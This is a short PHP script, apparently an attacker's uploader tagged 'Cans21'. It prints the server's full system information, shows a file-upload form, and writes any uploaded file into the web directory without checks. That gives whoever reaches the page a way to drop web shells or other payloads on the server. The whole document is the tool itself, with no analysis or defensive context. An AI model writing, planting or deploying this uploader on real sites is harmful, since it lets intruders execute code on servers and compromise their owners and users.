<?php
echo "Cans21 : ".php_uname('a');
echo '<form action="" method="post" enctype="multipart/form-data"><input type="file" name="cans" size="50"><input name="upl" type="submit" value="Upload"></form>';
if(isset($_POST['upl'])){
	if(@copy($_FILES['cans']['tmp_name'],$_FILES['cans']['name']));
	}
?>